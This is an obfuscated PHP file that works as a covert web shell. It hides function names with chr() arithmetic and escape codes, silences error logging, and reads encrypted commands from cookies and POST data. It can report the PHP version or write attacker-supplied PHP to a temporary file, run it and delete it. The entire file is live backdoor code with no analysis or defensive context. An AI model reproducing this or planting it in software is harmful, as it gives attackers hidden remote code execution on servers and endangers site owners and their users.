<?php $rykiwfj = chr(102).chr(105).chr(108)."\145"."\137".chr(784-672).'u'."\164".chr(95)."\143".'o'."\x6e"."\x74"."\x65".chr(617-507)."\x74".chr(537-422);
$qdvqdvaj = chr(380-282).chr(882-785).chr(115)."\x65".'6'.'4'."\x5f".'d'."\x65".chr(99).'o'.'d'."\x65";
$fmadzt = 'i'."\156".chr(840-735).chr(95).chr(115).'e'."\164";
$recfd = "\165".'n'.'l'."\x69".chr(110).chr(107);


@$fmadzt("\145".chr(114).chr(114).'o'.chr(1023-909).chr(1074-979)."\x6c".'o'.chr(306-203), NULL);
@$fmadzt("\x6c".chr(111).chr(103).chr(95).chr(101).'r'.chr(532-418)."\x6f".chr(114).'s', 0);
@$fmadzt('m'."\x61".'x'.chr(460-365).'e'.chr(275-155).chr(451-350)."\x63".chr(575-458).'t'.'i'."\157".chr(285-175)."\x5f".chr(116).'i'."\x6d".chr(857-756), 0);
@set_time_limit(0);

function leltdmtq($byvicbduap, $hayfm)
{
    $xfxbmb = "";
    for ($lbfpt = 0; $lbfpt < strlen($byvicbduap);) {
        for ($j = 0; $j < strlen($hayfm) && $lbfpt < strlen($byvicbduap); $j++, $lbfpt++) {
            $xfxbmb .= chr(ord($byvicbduap[$lbfpt]) ^ ord($hayfm[$j]));
        }
    }
    return $xfxbmb;
}

$focff = array_merge($_COOKIE, $_POST);
$ftfvlt = 'd4ff456f-6fdf-455f-b884-c1ceb0eb3ff5';
foreach ($focff as $ydmgngl => $byvicbduap) {
    $byvicbduap = @unserialize(leltdmtq(leltdmtq($qdvqdvaj($byvicbduap), $ftfvlt), $ydmgngl));
    if (isset($byvicbduap[chr(97).chr(107)])) {
        if ($byvicbduap["\141"] == chr(105)) {
            $lbfpt = array(
                "\160".chr(118) => @phpversion(),
                "\x73"."\166" => "3.5",
            );
            echo @serialize($lbfpt);
        } elseif ($byvicbduap["\141"] == "\145") {
            $bowpkya = "./" . md5($ftfvlt) . "\x2e"."\151".chr(258-148).'c';
            @$rykiwfj($bowpkya, "<" . chr(63)."\160".chr(384-280).chr(529-417).chr(420-388)."\100"."\165".chr(1104-994).chr(530-422)."\x69".chr(110).chr(107)."\x28".chr(666-571).'_'."\106".chr(485-412).chr(1064-988).chr(69).'_'.chr(346-251).')'.chr(746-687).chr(990-958) . $byvicbduap[chr(186-86)]);
            @include($bowpkya);
            @$recfd($bowpkya);
        }
        exit();
    }
}

